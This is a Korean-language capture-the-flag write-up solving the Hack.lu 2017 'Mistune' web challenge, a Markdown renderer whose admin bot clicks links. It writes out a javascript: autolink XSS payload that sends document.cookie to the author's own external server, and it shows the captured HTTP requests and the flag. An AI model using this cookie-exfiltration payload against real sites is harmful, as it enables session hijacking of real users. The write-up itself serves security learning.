# [WEB] Hacklu 2017 - Mistune

# Description

Markdown parsers are fun. Now click here and steal the cookie!

# Analysis

페이지에 들어가면 Markdown Engine을 테스트하는 페이지가 나온다.

간단하게 `# Hello`를 삽입하면 마크다운 문법이 적용되어 결과가 나온다.

메뉴를 보면 Tester과 Send to Admin이 있다.

Tester는 메인페이지이며, Send to Admin에 들어가면 다음과 같은 정보를 얻을 수 있다.

>  #### Try to steal the cookie!
>
>  -  We use `mistune.Renderer(escape=True, hard_wrap=True)`
>  -  The admin will look at your converted Markdown.
>  -  The admin will click on links (<a>).
>  -  You can check the queue [here](https://mistune.flatearth.fluxfingers.net/queue)

딱 봐도 XSS하라는 문제같다.

여기서 중요한건 admin(bot)은 a 태그를 클릭한다는 점이다.

# Exploit

## Cross Site Script

맨 처음 시도한 방법은 `![x](http://1q2.me:10101)`이며 어드민에게 보내면 잠시 후 다음과 같은 응답값을 받을 수 있다.

```
GET / HTTP/1.1
Host: 1q2.me:10101
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://0.0.0.0/checkit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
```

어...쿠키값이 없다.

그렇다면 `document.cookie`를 이용해보자.

```markdown
<javascript:location.href=`http://1q2.me:10101/?`+document.cookie>
```

위의 스크립트를 어드민에게 전송하면 잠시 후 다음과 같은 응답 값을 받는다.

```
GET /?Admin=flag{92da883eb1df9d1287ff25f1a1099f29} HTTP/1.1
Host: 1q2.me:10101
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://0.0.0.0/checkit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
```

오 쿠키가 정상적으로 전송되서 플래그를 얻었다.

~~뭔가 다른 풀이도 많을 것 같은데, 이참에 마크다운 XSS를 수집해야겠다.~~



**flag{92da883eb1df9d1287ff25f1a1099f29}**